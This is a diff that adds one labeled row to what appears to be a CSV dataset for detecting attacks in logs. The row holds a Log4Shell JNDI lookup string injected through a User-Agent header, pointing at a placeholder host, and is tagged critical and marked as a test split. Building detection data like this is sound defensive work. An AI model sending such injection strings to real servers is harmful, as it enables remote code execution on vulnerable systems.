@@ -1,0 +1,2 @@
+id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
+LS-004430,2026-05-17,splunk_attack_data,Request from User-Agent: ${jndi:ldap://PAYLOAD_INJECTED} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://payload_injected} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_splunk_test,critical
